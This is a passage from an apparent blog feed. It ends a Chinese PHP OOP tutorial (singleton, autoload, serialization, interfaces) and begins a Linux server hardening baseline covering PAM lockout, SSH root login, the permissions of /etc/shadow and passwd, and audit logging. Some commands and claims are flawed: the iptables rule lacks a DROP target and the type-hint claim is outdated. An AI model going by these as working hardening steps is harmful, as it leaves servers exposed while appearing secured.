<span class="token function">getObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 3.静态+公有, 获取一个对象</span>         <span class="token punctuation">{</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">empty</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$obj</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>                 self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token string">'wangjs'</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 如果以前没有创建过对象,就创建一个保存起来</span>              <span class="token punctuation">}</span>               <span class="token keyword">return</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$obj</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 返回类中保存的对象实例</span>         <span class="token punctuation">}</span>         <span class="token comment" spellcheck="true">//__clone 魔术方法进行私有化   防止在外部进行克隆操作</span>        <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">brand</span> <span class="token operator">=</span> <span class="token string">'奇瑞'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">price</span> <span class="token operator">=</span> <span class="token string">'13w'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//防止在对象被销毁的时候  进行实例化对象</span>        <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token punctuation">{</span>           <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token string">'奇瑞'</span><span class="token punctuation">,</span><span class="token string">'15w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="autoload-自动加载"><a href="#autoload-自动加载" class="headerlink" title="__autoload 自动加载"></a>__autoload 自动加载</h3><p>a) __autoload是一个魔术函数(不是一个魔术方法)</p><p>b) 当使用new 关键字实例化一个不存在的类的时候 ,继承一个不存在的类的时候自动触发</p><p>c) 接受一个参数  不存在的类名(字符串类型)</p><p>d) 作用就是自动加载类文件 (类的自动加载)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$className</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token string">'./libs/'</span><span class="token punctuation">.</span><span class="token variable">$className</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//注册一个自动加载类函数</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token string">'xxoo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p>serialize(串行化或者是序列化) 和  unserialize(反串行化或者是反序列化)</p><p>serialize() 是一个函数.</p><p>作用是将一个数组或者是对象 转化成一个字符串 便于持久化保存</p><p>应用场景: 缓存 方便数据传输</p><p>unserialize() 是一个函数</p><p>作用是将字符串还原成原来的数据,可能是数组也可能是对象</p><p>魔术方法</p><p>__sleep  当使用serialize进行串行化对象的时候 自动执行</p><p>作用 是要筛选要保留的属性的名称.</p><p>注意点:  必须要返回一个数组.</p><p>__wakeup  当使用unserialize反串行化一个对象的时候,会自动触发该魔术方法</p><p>作用 就是为了初始化反串行化出来的对象.</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'qqqq'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*        //串行化        $a = new A('wjs',19);        $se = serialize($a);        file_put_contents('xxoo.txt',$se);    */</span>    <span class="token comment" spellcheck="true">/*        //反串行化        $a = file_get_contents('xxoo.txt');        $c = unserialize($a);        var_dump($c);    */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>a). 使用abstract来修饰 类或者成员方法</p><p>b). 修饰的类不能实例化对象,  修饰的成员方法没有方法体</p><p>c). 如果一个类的内部 包含一个抽象方法,那么该类就是一个抽象类,必须要使用abstract来修饰</p><p>d). 子类继承抽象类  需要将抽象类中的所有抽象方法完全实现才能实例化对象,如果只实现了部分,那么该类仍然是一个抽象类 ,必须使用abstract来修饰</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">abstract</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">'我终于实现梦想了....'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>a). 接口是一种特殊的类,  声明方式用interface关键字</p><p>b). 接口中只能存在两种类型的代码  常量 和 抽象方法(抽象方法无需使用abstract来修饰,默认全部都是抽象方法)</p><p>d). 子类在继承(实现)接口的时候 ,使用的关键字是 <strong><code>implements</code></strong></p><p>e). 如果子类在实现接口的时候 ,将接口中所有的抽象方法完全实现,那么该类就是一个完整的设计,就能实例化对象,如果只实现部分方法,那么仍然是一个不完整的设计,必须要使用abstract来修饰</p><p>f). 接口的作用  限定方法的名称  统一标准</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">interface</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token constant">XXOO</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">implements</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">'你在说话吗???'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">extends</span> <span class="token class-name">B</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">'你在吃饭吗???'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> C<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">XXOO</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类型约束"><a href="#类型约束" class="headerlink" title="类型约束"></a>类型约束</h3><p>限定函数或者是成员方法的参数类型</p><p>注意:  类型约束 只支持两种类型的限定 一种就是数组,另一种就是对象</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//数组</span>        <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'qqq'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">xxoo</span><span class="token punctuation">(</span><span class="token keyword">Array</span> <span class="token variable">$arr</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">xxoo</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//对象 </span>        <span class="token keyword">class</span> <span class="token class-name">A</span>        <span class="token punctuation">{</span>            <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'wjs'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">xxoo</span><span class="token punctuation">(</span>A <span class="token variable">$a</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>        <span class="token function">xxoo</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多态性"><a href="#多态性" class="headerlink" title="多态性"></a>多态性</h3><p>同一个操作 针对不同的子类对象,将产生不同的结果</p><p>指在父类中定义的属性或行为被子类继承之后，可以具有不同的数据类型或表现出不同的行为. 这使得同一个属性或行为在父类及其各个子类中具有不同的语义。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>       <span class="token comment" spellcheck="true">//定义一个USB接口，让每个USB设略都遵守这个规范</span>    <span class="token keyword">interface</span> <span class="token class-name">USB</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//扩展一个USB键盘设置，实现USB接口</span>    <span class="token keyword">class</span> <span class="token class-name">Ukey</span> <span class="token keyword">implements</span> <span class="token class-name">USB</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">//按键盘的功能实现接口中的方法</span>            <span class="token keyword">echo</span> <span class="token string">"运行USB键盘设备&lt;br>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//扩展一个USB鼠标设置，实现USB接口</span>    <span class="token keyword">class</span> <span class="token class-name">Umouse</span> <span class="token keyword">implements</span> <span class="token class-name">USB</span> <span class="token punctuation">{</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//按鼠标的功能实现接口中的方法</span>            <span class="token keyword">echo</span> <span class="token string">"运行USB鼠标设备&lt;br>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//扩展一个USB存储设置，实现USB接口</span>    <span class="token keyword">class</span> <span class="token class-name">Ustore</span> <span class="token keyword">implements</span> <span class="token class-name">USB</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">//按存储的功能实现接口中的方法</span>            <span class="token keyword">echo</span> <span class="token string">"运行USB存储设备&lt;br>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//声明一个电脑类， 去使用USB设置</span>    <span class="token keyword">class</span> <span class="token class-name">Computer</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//电脑类中的一个方法可以应用任何一种USB设备</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">useUSB</span><span class="token punctuation">(</span><span class="token variable">$usb</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$usb</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$computer</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Computer</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//实例化一个电脑类的对象         </span>    <span class="token variable">$computer</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">useUSB</span><span class="token punctuation">(</span> <span class="token keyword">new</span> <span class="token class-name">Ukey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//为电脑插入一个USB键盘设备，并运行</span>    <span class="token variable">$computer</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">useUSB</span><span class="token punctuation">(</span> <span class="token keyword">new</span> <span class="token class-name">Umouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//为电脑插入一个USB鼠标设备，并运行</span>    <span class="token variable">$computer</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">useUSB</span><span class="token punctuation">(</span> <span class="token keyword">new</span> <span class="token class-name">Ustore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//为电脑插入一个USB存储设备，并运行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><pre><code>1.class_exists() — 检查类是否已定义2.get_class_methods() — 返回由类的方法名组成的数组3.method_exists() — 检查类的方法是否存在4.property_exists() — 检查对象或类是否具有该属性5.get_class() — 返回对象的类名6.get_object_vars() — 返回由对象属性组成的关联数组7.get_parent_class() — 返回对象或类的父类名</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Server安全配置基线(等保)</title>
      <link href="/posts/f25da8ca.html"/>
      <url>/posts/f25da8ca.html</url>
      
        <content type="html"><![CDATA[<h2 id="第1章-概述"><a href="#第1章-概述" class="headerlink" title="第1章 概述"></a><strong>第1章 概述</strong></h2><h3 id="1-1-目的"><a href="#1-1-目的" class="headerlink" title="1.1 目的"></a><strong>1.1 目的</strong></h3><p>本文档规定了所有维护管理的Linux操作系统的主机应当遵循的操作系统安全性设置标准，本文档旨在指导系统管理人员进行Linux操作系统的安全合规性检查和配置。</p><h3 id="1-2-适用范围"><a href="#1-2-适用范围" class="headerlink" title="1.2 适用范围"></a><strong>1.2 适用范围</strong></h3><p>本配置标准的使用者包括：服务器管理员、应用管理员、网络安全管理员、运维工程师。</p><p>本设置标准适用于Linux服务器系统。</p><h3 id="1-3-实施"><a href="#1-3-实施" class="headerlink" title="1.3 实施"></a><strong>1.3 实施</strong></h3><p>在本标准的执行过程中若有任何疑问或建议，应及时反馈。</p><h2 id="第2章-身份鉴别"><a href="#第2章-身份鉴别" class="headerlink" title="第2章 身份鉴别"></a><strong>第2章 身份鉴别</strong></h2><h3 id="2-1-身份标识唯一性"><a href="#2-1-身份标识唯一性" class="headerlink" title="2.1 身份标识唯一性"></a><strong>2.1 身份标识唯一性</strong></h3><p><strong>安全基线项目名称</strong>：</p><pre><code>应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换</code></pre><p><strong>实施操作</strong></p><pre><code>编辑/etc/login.defs添加身份标识基线配置vi /etc/login.defs PASS_MAX_DAYS 90 PASS_MIN_DAYS 1 PASS_MIN_LEN 8 PASS_WARN_AGE 7备注 系统默认配置如下PASS_MAX_DAYS 99999 --密码最长使用期限PASS_MIN_DAYS 0 --密码最短使用期限PASS_MIN_LEN 5 --密码最短长度PASS_WARN_AGE 7 --密码到期提醒时间</code></pre><h3 id="2-2-登录失败处理功能"><a href="#2-2-登录失败处理功能" class="headerlink" title="2.2 登录失败处理功能"></a>2.2 登录失败处理功能</h3><pre><code>安全基线项目名称 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施</code></pre><p><strong>实施操作</strong></p><p>1、/etc/pam.d/login 修改<br>主要是这段代码， 放在第二行<br>auth required pam_tally2.so deny=5 lock_time=300 even_deny_root root_unlock_time=300<br>deny：连续错误次数<br>lock_time：锁定时间 单位秒<br>even_deny_root root_unlock_time=300 这2个是root用户的配置</p><pre><code>%PAM-1.0auth      required  pam_tally2.so   deny=5  lock_time=300 even_deny_root root_unlock_time=300auth [user_unknown=ignore success=ok ignore=ignore default=bad] pam_securetty.soauth       substack     system-authauth       include      postlogin</code></pre><p>/etc/pam.d/sshd 修改<br>主要是这一行 auth required pam_tally2.so deny=5 unlock_time=300 even_deny_root root_unlock_time=300</p><pre><code>%PAM-1.0auth    required   pam_tally2.so   deny=5  unlock_time=300 even_deny_root root_unlock_time=300auth     required    pam_sepermit.soauth       substack     password-auth</code></pre><p>2、编辑/etc/profile添加登录连接超时自动退出配置</p><pre><code>vim /etc/profile ############### TMOUT=300s ############# source /etc/profile</code></pre><h3 id="2-3-防止网络信息被窃听"><a href="#2-3-防止网络信息被窃听" class="headerlink" title="2.3 防止网络信息被窃听"></a><strong>2.3 防止网络信息被窃听</strong></h3><p><strong>安全基线项目名称</strong> </p><pre><code>当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</code></pre><p><strong>实施操作</strong></p><p>1、通过iptables防火墙关闭23端口，确认仅22端口可以进行远程操作</p><p>iptables -A INPUT -p tcp –dport 23<br> iptables save<br> netstat -an|<strong>grep</strong> 22<br> netstat -an|<strong>grep</strong> 23</p><p>2、通过firewall-cmd防火墙关闭23端口，确认仅22端口可以进行远程操作</p><p>firewall-cmd <em>–list-ports</em><br> firewall-cmd <em>–zone=public –remove-port=23/tcp –permanent</em><br> firewall-cmd <em>–reload</em></p><h2 id="第3章-访问控制"><a href="#第3章-访问控制" class="headerlink" title="第3章 访问控制"></a><strong>第3章 访问控制</strong></h2><h3 id="3-1-权限控制"><a href="#3-1-权限控制" class="headerlink" title="3.1 权限控制"></a><strong>3.1 权限控制</strong></h3><p><strong>安全基线项目名称</strong> </p><p>应对登录的用户分配账户和权限；应授予管理用户所需的最小权限，实现管理用户的权限分离；访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级；</p><p><strong>实施操作</strong></p><p>1、检查存在不符合再更改</p><pre><code>建议配置文件的权限值不大于644，可执行文件不大于755通过ls -l 可以查看权限值大小</code></pre><p>2、建议做到三权分立，即拥有最高管理员（root，可视为安全员）、应用账户（视为操作员）、审计账户（审计员，仅有日志查看权限），所有用户一一对应使用方或具体人员</p><p>3、查看/etc/sudo.conf文件，核查root级用户的权限都授予哪些账户</p><pre><code>more /etc/sudo.conf</code></pre><h3 id="3-2-用户安全控制"><a href="#3-2-用户安全控制" class="headerlink" title="3.2 用户安全控制"></a><strong>3.2 用户安全控制</strong></h3><p><strong>安全基线项目名称</strong> </p><pre><code>应重命名或删除默认账户，修改默认账户的默认口令；应及时删除或停用多余的、过期的账户，避免共享账户的存在</code></pre><p><strong>实施操作</strong></p><p>1、检查/etc/passwd文件，对不启用的用户登录配置为/sbin/nologin或以#号注释，举例如下</p><pre><code>viM /etc/passwd mysql:x:1000:1000::/home/mysql:/sbin/nologin #ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</code></pre><p>2、检查是否已修改默认账户的默认密码</p><p>3、是否存在空密码用户，查看/etc/shadow文件，询问相应账户是否为过期、多余账户</p><pre><code>more /etc/passwd</code></pre><p>4、应及时删除或停用多余的、过期的账户，避免共享账户的存在，将无用账户删除，如games、news、ftp、lp、halt、shutdown等默认账户，其余自建账户需明确负责人</p><pre><code>cd /home &amp;&amp; lsuserdel -r 用户名</code></pre><h3 id="3-3-禁用root用户登录，修改默认远程控制端口"><a href="#3-3-禁用root用户登录，修改默认远程控制端口" class="headerlink" title="3.3 禁用root用户登录，修改默认远程控制端口"></a><strong>3.3 禁用root用户登录，修改默认远程控制端口</strong></h3><p><strong>安全基线项目名称</strong> </p><pre><code>应禁用root用户远程登录，使得者无法通过暴力破解来获取root权限；访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级；</code></pre><p>实施操作</p><p>1、添加一个普通用户，如admin，并配置满足复杂度要求的密码</p><pre><code>useradd admin passwd admin</code></pre><p>2、使用admin用户与配置的密码验证是否正常通过ssh登录到服务器，并验证是否正常切换到root用户</p><pre><code>su - root</code></pre><p>3、修改/etc/ssh/sshd_config配置文件，修改ssh默认连接端口并禁止root用户远程登录</p><pre><code>vi /etc/ssh/sshd_config Port 3122 PermitRootLogin no重启sshd服务service sshd restart 或 systemctl restart sshd</code></pre><p>3、passwd、shadow、group等重要文件夹仅root权限可以修改</p><p>（1）/etc/passwd 所有用户都可读，root用户可写 –rw-r—r—</p><p>配置命令：</p><pre><code>ls -l /etc/passwd chmod 644 /etc/passwd</code></pre><p>（2）/etc/shadow 只有root可读 –r——–</p><p>配置命令：</p><pre><code>ls -l /etc/shadowchmod 400 /etc/shadow</code></pre><p>（3）/etc/group 必须所有用户都可读，root用户可写 –rw-r—r—</p><p>配置命令：</p><pre><code>ls -l /etc/groupchmod 644 /etc/group</code></pre><p>（4）个别特殊环境，可对文件进行锁定</p><pre><code> chattr +i /etc/passwd chattr +i /etc/shadow chattr +i /etc/group chattr +i /etc/gshadow</code></pre><p><strong>备注</strong></p><p>1、请切记：一定要验证新增的admin用户可正常登录到操作系统，否则重启sshd服务将会失去对系统的控制！！！！</p><p>2、解锁文件请使用如下命令</p><pre><code> chattr -i /etc/passwd chattr -i /etc/shadow chattr -i /etc/group chattr -i /etc/gshadow</code></pre><h2 id="第4章-安全审计"><a href="#第4章-安全审计" class="headerlink" title="第4章 安全审计"></a><strong>第4章 安全审计</strong></h2><h3 id="4-1-启用系统安全审计"><a href="#4-1-启用系统安全审计" class="headerlink" title="4.1 启用系统安全审计"></a><strong>4.1 启用系统安全审计</strong></h3><p><strong>安全基线项目名称</strong> </p><pre><code>应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计；</code></pre><p><strong>实施操作</strong></p><p>查看审计服务并启动审计服务</p><p>ps -ef | grep auditd<br> service auditd status  或 systemctl status auditd<br> service auditd <strong>start</strong>  或 systemctl <strong>start</strong> auditd</p><p><strong>4.2 审计日志的记录与保护</strong></p><p><strong>安全基线项目名称</strong> 审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息；应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等；应对审计进程进行保护，防止未经授权的中断</p><p><strong>实施操作</strong></p><p>1、配置远程日志存储服务器</p><pre><code>vi /etc/rsyslog.conf 注：格式如下**.**后面跟tab建，端口小于1024时需要配置设置selinux **#\*.\* @@remote-host:514** **.** @192.168.31.100services syslogd restart 或 systemctl restart rsyslog</code></pre><p>2、查看/etc/rsyslog.conf配置文件，确认是否添加authpriv.* /var/log/secure配置（中间的分隔符是tab键）</p><pre><code>grep "^authpriv.*" /etc/rsyslog.conf</code></pre><p>3、设置history时间戳</p><pre><code>vi /etc/profile HISTFILESIZE=2000 HISTSIZE=2000 HISTTIMEFORMAT="%Y-%m-%d:%H-%M-%S:`whoami`:" export HISTTIMEFORMAT source /etc/profile</code></pre><p>备注 